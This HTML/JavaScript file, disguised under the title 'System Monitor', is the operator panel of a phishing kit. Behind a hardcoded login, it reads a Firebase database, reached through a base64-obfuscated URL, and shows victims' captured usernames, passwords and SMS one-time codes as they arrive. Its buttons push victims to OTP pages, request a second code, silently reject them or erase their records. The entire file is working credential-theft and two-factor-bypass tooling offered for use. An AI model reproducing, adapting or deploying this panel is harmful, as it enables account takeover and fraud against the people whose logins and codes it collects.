<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor - v2.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { background-color: #0f172a; font-family: 'Inter', sans-serif; }
        .card-user { transition: all 0.3s ease; border: 1px solid #1e293b; position: relative; overflow: hidden; }
        .card-user:hover { transform: translateY(-5px); border-color: #3b82f6; box-shadow: 0 15px 30px -10px rgba(0, 0, 0, 0.5); }
        .led-blink { animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        #panel-content { display: none; }
        #login-overlay { display: flex; }
        .shake { animation: shake 0.5s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
    </style>
</head>
<body class="p-4 md:p-8">

    <div id="login-overlay" class="fixed inset-0 bg-slate-900 z-50 flex items-center justify-center p-4">
        <div class="bg-slate-800 p-8 rounded-2xl border border-slate-700 w-full max-w-md shadow-2xl text-center">
            <h2 class="text-white text-2xl font-black mb-6 italic">ACCESO <span class="text-blue-500">RESTRINGIDO</span></h2>
            <div class="space-y-4 text-left">
                <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white outline-none focus:border-blue-500 transition" autocomplete="off">
                <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white outline-none focus:border-blue-500 transition" autocomplete="off">
                <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg transition uppercase tracking-widest text-sm">Entrar al Panel</button>
            </div>
            <p id="error-msg" class="text-rose-500 text-xs mt-4 hidden font-bold uppercase"></p>
            <p id="bloqueo-msg" class="text-amber-500 text-xs mt-2 hidden">Demasiados intentos. Espera <span id="tiempo-restante">60</span>s</p>
        </div>
    </div>

    <div id="panel-content">
        <header class="mb-10 flex flex-col md:flex-row justify-between items-center gap-4 border-b border-slate-800 pb-6">
            <div>
                <h1 class="text-3xl font-black text-white italic tracking-tighter">C-PANEL <span class="text-blue-500">JS C0D3R</span></h1>
                <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.3em]">Ambato Monitoring System</p>
            </div>
            <div class="flex items-center gap-4">
                <div class="flex items-center gap-2 bg-slate-800/50 px-4 py-2 rounded-full border border-slate-700">
                    <span class="w-2 h-2 bg-emerald-500 rounded-full led-blink"></span>
                    <span class="text-[10px] font-bold text-emerald-400 uppercase">Sistema Live</span>
                </div>
                <div class="text-right">
                    <p class="text-[10px] text-slate-500">IP Actual</p>
                    <p id="ip-actual" class="text-[10px] text-blue-400 font-mono">Detectando...</p>
                </div>
                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-rose-400 text-[10px] uppercase font-black transition">
                    <i class="fa-solid fa-power-off mr-1"></i> Salir
                </button>
            </div>
        </header>

        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6"></div>
    </div>

    <script>
        // CONFIGURACION - URL actualizada
        const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
        const MAX_INTENTOS = 3;
        const TIEMPO_BLOQUEO = 300000;
        
        // SISTEMA DE SEGURIDAD
        let intentos = parseInt(localStorage.getItem('sec_intentos') || '0');
        let ultimoIntento = parseInt(localStorage.getItem('sec_ultimo') || '0');
        
        function estaBloqueado() {
            if (intentos >= MAX_INTENTOS) {
                const tiempoPasado = Date.now() - ultimoIntento;
                if (tiempoPasado < TIEMPO_BLOQUEO) {
                    return Math.ceil((TIEMPO_BLOQUEO - tiempoPasado) / 1000);
                }
                resetearSeguridad();
            }
            return false;
        }
        
        function registrarIntentoFallido() {
            intentos++;
            ultimoIntento = Date.now();
            localStorage.setItem('sec_intentos', intentos.toString());
            localStorage.setItem('sec_ultimo', ultimoIntento.toString());
        }
        
        function resetearSeguridad() {
            intentos = 0;
            localStorage.removeItem('sec_intentos');
            localStorage.removeItem('sec_ultimo');
        }
        
        // AUDIO
        const sonidoLogin = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
        const sonidoOTP = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
        let audioDesbloqueado = false;
        
        document.addEventListener('click', function() {
            if (!audioDesbloqueado) {
                sonidoLogin.play().then(() => {
                    sonidoLogin.pause();
                    sonidoLogin.currentTime = 0;
                    audioDesbloqueado = true;
                }).catch(() => {});
            }
        }, { once: true });
        
        // AUTH
        const USER_CORRECTO = "Ghost";
        const PASS_CORRECTO = "Cabimas01.";
        
        function validarAcceso() {
            const bloqueo = estaBloqueado();
            if (bloqueo) {
                mostrarError("Bloqueado por " + bloqueo + " segundos");
                document.getElementById('bloqueo-msg').classList.remove('hidden');
                iniciarCuentaRegresiva(bloqueo);
                return;
            }
            
            const u = document.getElementById('admin-user').value;
            const p = document.getElementById('admin-pass').value;
            
            if (!u || !p) {
                mostrarError('Complete todos los campos');
                return;
            }
            
            if (u === USER_CORRECTO && p === PASS_CORRECTO) {
                resetearSeguridad();
                sessionStorage.setItem('auth_panel', 'true');
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('panel-content').style.display = 'block';
                iniciarFirebase();
            } else {
                registrarIntentoFallido();
                const restantes = MAX_INTENTOS - intentos;
                mostrarError('Credenciales incorrectas. Intentos: ' + restantes);
                
                if (restantes <= 0) {
                    document.getElementById('bloqueo-msg').classList.remove('hidden');
                    iniciarCuentaRegresiva(300);
                }
            }
        }
        
        function mostrarError(msg) {
            const el = document.getElementById('error-msg');
            el.textContent = msg;
            el.classList.remove('hidden');
            document.querySelector('.bg-slate-800').classList.add('shake');
            setTimeout(() => {
                document.querySelector('.bg-slate-800').classList.remove('shake');
            }, 500);
        }
        
        function iniciarCuentaRegresiva(segundos) {
            const span = document.getElementById('tiempo-restante');
            span.textContent = segundos;
            const interval = setInterval(() => {
                segundos--;
                span.textContent = segundos;
                if (segundos <= 0) {
                    clearInterval(interval);
                    document.getElementById('bloqueo-msg').classList.add('hidden');
                    document.getElementById('error-msg').classList.add('hidden');
                }
            }, 1000);
        }
        
        function cerrarSesion() {
            sessionStorage.removeItem('auth_panel');
            window.location.reload();
        }
        
        // AUTO LOGIN
        if (sessionStorage.getItem('auth_panel') === 'true') {
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('panel-content').style.display = 'block';
            iniciarFirebase();
        }
        
        // IP
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                document.getElementById('ip-actual').textContent = data.ip;
            })
            .catch(() => {
                document.getElementById('ip-actual').textContent = 'N/A';
            });
        
        // FIREBASE
        function iniciarFirebase() {
            const firebaseConfig = { databaseURL: DB_URL };
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            const db = firebase.database();
            
            let cargaInicial = true;
            
            setTimeout(() => { cargaInicial = false; }, 3000);
            
            db.ref('logins').on('child_added', () => {
                if (!cargaInicial && audioDesbloqueado) sonidoLogin.play().catch(() => {});
            });
            
            db.ref('logins').on('child_changed', (snap) => {
                const data = snap.val();
                if (data.sms && data.sms !== '----' && audioDesbloqueado) {
                    sonidoOTP.play().catch(() => {});
                }
            });
            
            db.ref('logins').on('value', (snapshot) => {
                const container = document.getElementById('container');
                container.innerHTML = '';
                
                snapshot.forEach((child) => {
                    const id = child.key;
                    const data = child.val();
                    const isOnline = data.online === true;
                    
                    container.innerHTML += `
                        <div class="card-user bg-slate-800 p-5 rounded-2xl shadow-xl ${isOnline ? 'border-t-2 border-emerald-500' : 'opacity-60'}">
                            <div class="flex justify-between items-center mb-4">
                                <span class="text-[8px] font-mono text-slate-500">#${id.slice(-6)}</span>
                                <div class="flex items-center gap-2">
                                    <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-slate-600'}"></span>
                                    <span class="text-[9px] font-black uppercase ${isOnline ? 'text-emerald-400' : 'text-slate-500'}">
                                        ${isOnline ? 'Online' : 'Offline'}
                                    </span>
                                </div>
                            </div>
                            
                            <div class="space-y-2 mb-4">
                                <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-700/50">
                                    <p class="text-[9px] text-slate-500 uppercase font-bold">User</p>
                                    <p class="text-white text-sm font-bold truncate">${data.user || 'Esperando...'}</p>
                                </div>
                                <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-700/50">
                                    <p class="text-[9px] text-slate-500 uppercase font-bold">Pass</p>
                                    <p class="text-rose-400 text-sm font-black tracking-wider">${data.pass || '********'}</p>
                                </div>
                            </div>
                            
                            <div class="mb-4">
                                <div class="bg-blue-900/10 border border-blue-500/20 p-3 rounded-xl text-center">
                                    <p class="text-[9px] font-bold text-blue-500 uppercase mb-1">Código Recibido</p>
                                    <p class="text-2xl font-black text-blue-400 tracking-[0.2em]">${data.sms || '----'}</p>
                                </div>
                            </div>
                            
                            <div class="flex items-center justify-between mb-4 px-1">
                                <p class="text-[10px] text-slate-400 italic">
                                    <i class="fa-solid fa-location-dot mr-1"></i> ${data.step || 'En Inicio'}
                                </p>
                            </div>
                            
                            <div class="grid grid-cols-2 gap-2">
                                <button onclick="orden('${id}', 'otp.html')" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 rounded-lg text-[10px] transition uppercase flex items-center justify-center gap-1">
                                    <i class="fa-solid fa-comment-sms"></i> OTP 1
                                </button>
                                <button onclick="orden('${id}', 'otp2.html')" class="bg-orange-600 hover:bg-orange-500 text-white font-bold py-2 rounded-lg text-[10px] transition uppercase flex items-center justify-center gap-1">
                                    <i class="fa-solid fa-sync"></i> Re-OTP
                                </button>
                                <button onclick="rechazoSilencioso('${id}')" class="bg-rose-600/20 hover:bg-rose-600 text-rose-500 hover:text-white border border-rose-600/30 font-bold py-2 rounded-lg text-[10px] transition uppercase">
                                    Rechazar
                                </button>
                                <button onclick="eliminar('${id}')" class="bg-slate-900 hover:bg-red-900/40 text-slate-500 hover:text-red-400 font-bold py-2 rounded-lg text-[10px] transition uppercase border border-slate-700">
                                    Borrar
                                </button>
                            </div>
                        </div>
                    `;
                });
            });
            
            window.orden = function(id, pagina) {
                db.ref('comandos/' + id).set({ redirect: pagina, ts: Date.now() });
            };
            
            window.eliminar = function(id) {
                if (confirm('¿Eliminar este registro?')) {
                    db.ref('logins/' + id).remove();
                    db.ref('comandos/' + id).remove();
                }
            };
            
            window.rechazoSilencioso = function(id) {
                db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() })
                    .then(() => {
                        db.ref('logins/' + id).update({ sms: '', step: 'Error Credenciales' });
                    });
            };
        }
    </script>
</body>
</html>
